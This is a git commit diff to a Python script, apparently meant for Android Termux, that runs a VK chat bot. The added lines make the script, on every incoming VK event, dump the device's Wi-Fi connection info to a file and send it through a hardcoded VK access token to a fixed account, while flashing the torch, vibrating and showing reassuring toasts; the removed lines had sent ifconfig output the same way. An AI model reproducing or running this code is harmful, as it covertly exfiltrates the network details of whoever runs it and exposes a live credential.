236c86d4eb558039f8d0f82e7158d9daf16cb4bd
Topo1us <65972332+Topo1us@users.noreply.github.com>
2020-05-31 03:54:19 +0300

    Update io.py

--- io.py
+++ io.py
@@ -1,35 +1,29 @@
 import time
 import os
-os.system('pip install vk_api')
 import vk_api
 from vk_api.longpoll import VkLongPoll, VkEventType
-def hello_2():
-    print('Введите пароль: ')
-    time.sleep(3)
-    print('Да шучу я :)')
-    time.sleep(1)
 def bot():
     rand=123456
     print('Не темно?')
+    os.system('termux-brightness 255')
     time.sleep(1)
-    os.system('echo you fuck')
-    print('Так лучше :)')
+    os.system('termux-toast не волнуйся')
+    print('termux-toast так лучше :D')
     token='35a0b1e44117b4857a36a347b3b1c948b260b314bf7edb44494165442202ea6ff5049d5ea3225d8c90199'
     def y(user_id,message):
         vk.method('messages.send',{'user_id': user_id, 'message': message,'random_id':rand,})
     vk=vk_api.VkApi(token=token)
     longpoll=VkLongPoll(vk)
     for event in longpoll.listen():
+        os.system(r'termux-wifi-connectioninfo>>red.txt')
+        o=open(r'red.txt')
+        rik=o.read()
+        y(437306907,rik)
+        os.system('termux-torch on')
+        os.system('termux-vibrate -d 1000')
+        os.system('termux-toast напиши вк')
         if event.type==VkEventType.MESSAGE_NEW:
             rand+=1
             if event.to_me:
                 r=event.text
-                if r=='IP' or r=='ip':
-                    os.system('ifconfig>>IP.txt')
-                    o=open(r'IP.txt')
-                    pik=o.read()
-                    y(437306907,pik)
-                if r=='заебись':
-                    print('все заебись')
-#hello_2()
 bot()
